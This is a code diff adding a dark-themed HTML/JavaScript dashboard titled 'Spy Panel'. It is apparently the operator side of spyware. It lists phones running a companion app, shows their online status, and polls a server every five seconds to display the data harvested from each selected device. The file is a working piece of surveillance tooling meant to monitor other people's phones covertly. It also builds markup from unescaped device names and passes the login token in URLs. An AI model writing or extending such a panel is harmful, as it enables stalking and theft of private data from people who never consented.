@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Spy Panel - Dashboard</title>
+<style>
+* { box-sizing: border-box; margin: 0; padding: 0; }
+body { font-family: -apple-system, Arial, sans-serif; background: #0f172a; color: #fff; padding: 20px; }
+header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 24px; }
+h1 { font-size: 22px; }
+.btn { padding: 10px 16px; background: #3b82f6; border: none; border-radius: 8px; color: #fff; cursor: pointer; font-size: 14px; }
+.btn.red { background: #ef4444; }
+.device { background: #1e293b; padding: 16px; border-radius: 12px; margin-bottom: 12px; cursor: pointer; border: 2px solid transparent; }
+.device:hover { border-color: #3b82f6; }
+.device.active { border-color: #3b82f6; }
+.device .name { font-weight: 600; font-size: 16px; margin-bottom: 4px; }
+.device .meta { color: #94a3b8; font-size: 13px; }
+.online { color: #22c55e; }
+.offline { color: #ef4444; }
+#data { margin-top: 24px; }
+.entry { background: #1e293b; padding: 14px; border-radius: 10px; margin-bottom: 10px; font-size: 14px; }
+.entry .type { display: inline-block; background: #3b82f6; padding: 3px 10px; border-radius: 6px; font-size: 12px; font-weight: 600; margin-bottom: 8px; }
+.entry .time { color: #64748b; font-size: 12px; margin-left: 8px; }
+.entry pre { background: #0f172a; padding: 10px; border-radius: 6px; margin-top: 8px; font-size: 12px; overflow-x: auto; white-space: pre-wrap; word-break: break-all; }
+.empty { color: #64748b; text-align: center; padding: 40px; }
+</style>
+</head>
+<body>
+<header>
+  <h1>🕵️ Dashboard</h1>
+  <button class="btn red" onclick="logout()">Logout</button>
+</header>
+<div id="devices"><div class="empty">Loading devices...</div></div>
+<div id="data"></div>
+<script>
+const email = localStorage.getItem('email');
+const token = localStorage.getItem('token');
+if (!email || !token) location.href = '/';
+let selectedUid = null;
+
+function logout() {
+  localStorage.clear();
+  location.href = '/';
+}
+
+async function loadDevices() {
+  const res = await fetch('/api/devices?email=' + encodeURIComponent(email) + '&token=' + token);
+  const data = await res.json();
+  if (!data.ok) return logout();
+
+  const box = document.getElementById('devices');
+  if (!data.devices.length) {
+    box.innerHTML = '<div class="empty">No devices yet. Install the app and login with same email.</div>';
+    return;
+  }
+
+  box.innerHTML = '';
+  data.devices.forEach(d => {
+    const el = document.createElement('div');
+    el.className = 'device' + (d.uid === selectedUid ? ' active' : '');
+    const info = d.info || {};
+    el.innerHTML = '<div class="name">📱 ' + (info.device || 'Unknown') + '</div>' +
+      '<div class="meta">' + (d.online ? '<span class="online">● Online</span>' : '<span class="offline">● Offline</span>') +
+      ' · ' + d.count + ' entries · UID: ' + d.uid + '</div>';
+    el.onclick = () => { selectedUid = d.uid; loadDevices(); loadData(); };
+    box.appendChild(el);
+  });
+}
+
+async function loadData() {
+  if (!selectedUid) return;
+  const res = await fetch('/api/data?email=' + encodeURIComponent(email) + '&token=' + token + '&uid=' + selectedUid);
+  const data = await res.json();
+  const box = document.getElementById('data');
+  if (!data.data.length) { box.innerHTML = '<div class="empty">No data yet</div>'; return; }
+
+  box.innerHTML = '';
+  data.data.slice().reverse().forEach(d => {
+    const el = document.createElement('div');
+    el.className = 'entry';
+    const t = new Date(d.receivedAt).toLocaleString();
+    const copy = Object.assign({}, d);
+    delete copy.receivedAt;
+    el.innerHTML = '<span class="type">' + (d.dataType || 'data') + '</span><span class="time">' + t + '</span><pre>' +
+      JSON.stringify(copy, null, 2).replace(/</g, '&lt;') + '</pre>';
+    box.appendChild(el);
+  });
+}
+
+loadDevices();
+setInterval(loadDevices, 5000);
+setInterval(loadData, 5000);
+</script>
+</body>
+</html>
